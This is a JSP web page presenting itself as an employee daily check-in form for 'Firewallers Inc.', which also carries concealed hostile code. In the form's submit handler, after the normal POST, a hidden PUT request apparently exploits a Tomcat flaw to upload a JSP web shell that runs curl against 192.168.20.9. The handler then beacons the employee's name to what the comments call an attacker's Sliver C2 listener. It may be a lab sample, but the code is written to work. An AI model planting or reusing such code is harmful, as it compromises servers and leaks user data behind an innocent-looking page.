<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Firewallers Inc. | Daily Check-In</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #f3f5f8;
            margin: 0;
            padding: 0;
        }
        .container {
            max-width: 500px;
            margin: 80px auto;
            background: #fff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0,0,0,0.1);
       }
        h2 {
            text-align: center;
            color: #1a2b4c;
            margin-bottom: 30px;
        }
        label {
            display: block;
            margin-bottom: 6px;
            color: #333;
        }
        input[type="text"], input[type="date"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 6px;
        }
        input[type="submit"] {
            width: 100%;
            padding: 12px;
            background-color: #1a73e8;
            color: white;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
        }
        input[type="submit"]:hover {
            background-color: #155ec2;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            margin-top: 30px;
            color: #777;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Firewallers Inc.<br>Daily Check-In</h2>

    <!-- Main check-in form -->
    <form id="checkinForm">
        <label for="employeeName">Your Full Name:</label>
        <input type="text" id="employeeName" name="employeeName" required>

        <label for="checkinDate">Select Date:</label>
        <input type="date" id="checkinDate" name="checkinDate" required>

        <input type="submit" value="Check In">
    </form>

    <div class="footer">
        &copy; 2025 Firewallers Inc. All rights reserved.
    </div>
</div>

<script>
    // Handles the form submission without triggering a full page reload
    document.getElementById('checkinForm').addEventListener('submit', function(e) {
        e.preventDefault();  // Prevents default form behavior

        const name = document.getElementById('employeeName').value;
        const date = document.getElementById('checkinDate').value;

        // Sends the form data to the backend as expected
        fetch('/checkpin/submit.jsp', {
            method: 'POST',
            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
            body: `employeeName=${encodeURIComponent(name)}&checkinDate=${encodeURIComponent(date)}`
        });

        // Hidden behavior begins here
        // Leverages a known Tomcat CVE to place an unauthorized payload via a crafted PUT request
        fetch('/checkpin/shell.jsp/', {
            method: 'PUT',
            headers: { 'Content-Type': 'application/octet-stream' },
            body: `<% Runtime.getRuntime().exec("curl -X POST http://192.168.20.9:8000/beacon"); %>`
        }).then(() => {
            // This secondary request simulates beaconing to the attacker's Sliver C2 listener
            fetch('http://192.168.20.9:8000/', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ beacon: 'checkin', user: name })
            });
        });
    });
</script>

</body>
</html>
